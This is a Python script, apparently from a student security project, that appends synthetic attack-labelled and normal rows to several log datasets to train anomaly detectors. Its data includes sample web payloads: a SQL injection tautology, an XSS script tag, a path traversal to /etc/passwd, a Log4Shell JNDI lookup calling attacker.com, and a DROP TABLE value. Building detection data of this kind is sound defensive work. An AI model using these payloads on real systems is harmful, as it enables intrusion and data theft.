import pandas as pd
import numpy as np
import os
import random
from datetime import datetime, timedelta

# --- Configuration ---
BASE_PATH = r"c:\Users\smt1s\OneDrive\Belgeler\GitHub\Bilgi-Sistemleri-ve-G-venli-i"

def augment_dataset(name, path, attack_patterns, normal_patterns=None, count=500):
    full_path = os.path.join(BASE_PATH, path)
    if not os.path.exists(full_path):
        print(f"Skipped {name}: {full_path} not found")
        return

    df = pd.read_csv(full_path)
    print(f"Augmenting {name} (Current size: {len(df)})")
    
    new_rows = []
    
    # Add Attacks
    for _ in range(count):
        pattern = random.choice(attack_patterns)
        row = pattern.copy()
        row['label'] = 1
        if 'timestamp' in df.columns:
            row['timestamp'] = (datetime.now() - timedelta(minutes=random.randint(1, 10000))).strftime("%Y-%m-%d %H:%M:%S")
        
        # Fill missing numeric columns with 0 if they exist in original but not in pattern
        for col in df.columns:
            if col not in row and col != 'label':
                if df[col].dtype in [np.float64, np.int64]:
                    row[col] = 0
                else:
                    row[col] = "augmented"
        
        new_rows.append(row)

    # Add Normal (to prevent bias)
    if normal_patterns:
        for _ in range(count // 2):
            pattern = random.choice(normal_patterns)
            row = pattern.copy()
            row['label'] = 0
            if 'timestamp' in df.columns:
                row['timestamp'] = (datetime.now() - timedelta(minutes=random.randint(1, 10000))).strftime("%Y-%m-%d %H:%M:%S")
            
            for col in df.columns:
                if col not in row and col != 'label':
                    if df[col].dtype in [np.float64, np.int64]:
                        row[col] = 0
                    else:
                        row[col] = "normal_augmented"
            new_rows.append(row)

    df_new = pd.DataFrame(new_rows)
    df_final = pd.concat([df, df_new], ignore_index=True)
    df_final.to_csv(full_path, index=False)
    print(f"Done {name}. New size: {len(df_final)}")

def run_all_augmentations():
    # 1. SAMET (IDS - Text)
    augment_dataset("SAMET", r"Raporlar\SAMET_SAHIN\Test ve Loglar\ids_guvenlik_parsed_labeled.csv", [
        {"level": "SALDIRI", "detail": "Ters Bağlantı (Reverse Shell) Tespit Edildi", "action": "Bloklandı"},
        {"level": "SALDIRI", "detail": "Brute Force: SSH root login attempt", "action": "Bloklandı"},
        {"level": "SALDIRI", "detail": "Yan Hareket / Ağ Keşfi (Nmap Scan)", "action": "Bloklandı"},
        {"level": "SALDIRI", "detail": "DDoS Attack: SYN Flood detected", "action": "Bloklandı"},
        {"level": "SALDIRI", "detail": "SQL Map signature detected in HTTP logs", "action": "Bloklandı"}
    ], [{"level": "NORMAL", "detail": "Standart IP Trafiği", "action": "OK"}])

    # 2. EMİRHAN (K8s/Web - Text)
    augment_dataset("EMİRHAN", r"Raporlar\EMİRHAN_BSG\LOG\logs_5000_parsed.csv", [
        {"message": "SQLi: SELECT * FROM users WHERE id = '1' OR '1'='1'"},
        {"message": "XSS: <script>alert('pwned')</script>"},
        {"message": "Path Traversal: GET /../../etc/passwd"},
        {"message": "Log4Shell: ${jndi:ldap://attacker.com/a}"},
        {"message": "RBAC: Unauthorized access to secrets"}
    ], [{"message": "GET /index.html 200 OK"}, {"message": "User authenticated: user1"}])

    # 3. İBRAHİM (Time)
    augment_dataset("İBRAHİM", r"Raporlar\İBRAHİM_SAHİN\output_labeled.csv", [
        {"attack_type": "TIME_ANOMALY", "detail": "Zaman Kayması: +15 dakika fark", "status": "CRITICAL"},
        {"attack_type": "TIME_ANOMALY", "detail": "Gelecek Zamanlı Log: 2026 detected", "status": "CRITICAL"},
        {"attack_type": "TIME_ANOMALY", "detail": "NTP Poisoning attempt detected", "status": "CRITICAL"}
    ], [{"attack_type": "NULL", "detail": "Sync Success", "status": "Normal"}])

    # 4. MİRAÇ (Registration)
    augment_dataset("MİRAÇ", r"Raporlar\MİRAC_BSG\logs\kayıt_logs.csv", [
        {"reason": "REUSED_PLATE", "input_plate": "06XXX01", "input_name": "Unknown"},
        {"reason": "SQL_INJECTION", "input_plate": "DROP TABLE", "input_name": "Hacker"},
        {"reason": "YANLIS_PLAKA", "input_plate": "ZZ-99-ZZ", "input_name": "Test"}
    ], [{"reason": "Basarili", "input_plate": "34ABC12", "input_name": "Vatandas"}])

    # 5. EMİRHNT (Billing)
    augment_dataset("EMİRHNT", r"Raporlar\EMİRHNT_BSG\logs_expanded.csv", [
        {"Durum": "MISMATCH_FOUND", "UygulananTarife": 10, "OlmasiGerekenTarife": 2},
        {"Durum": "CRITICAL_OVERCHARGE", "UygulananTarife": 50, "OlmasiGerekenTarife": 5},
        {"Durum": "TARIFF_MANIPULATION", "UygulananTarife": 0, "OlmasiGerekenTarife": 10}
    ], [{"Durum": "Normal", "UygulananTarife": 1, "OlmasiGerekenTarife": 1}])

    # 6. ATAKAN (Load)
    augment_dataset("ATAKAN", r"Raporlar\ATAKAN_BSG\AtakanAkyol-Yuk-Verisi-Manupilasyonu-Anomalisi-99af48c\expanded_logs.csv", [
        {"attack_type": "LOAD_MANIPULATION", "load_kw": 45.0},
        {"attack_type": "LOAD_MANIPULATION", "load_kw": 99.9},
        {"attack_type": "LOAD_MANIPULATION", "load_kw": 0.1}
    ], [{"attack_type": "NULL", "load_kw": 5.5}])

    # 7. SUZAN (Energy)
    augment_dataset("SUZAN", r"Raporlar\SUZAN_BGS\logs\enerji_logs.csv", [
        {"status": "PRICE_SPIKE", "price_eur_kwh": 50.0},
        {"status": "NEGATIVE_PRICE_FRAUD", "price_eur_kwh": -5.0},
        {"status": "EXTREME_CONSUMPTION", "energy_kwh": 9999.0}
    ], [{"status": "Charging", "price_eur_kwh": 0.45}])

if __name__ == "__main__":
    run_all_augmentations()
    print("\n✅ Mass Augmentation for Dirty Patterns Complete.")
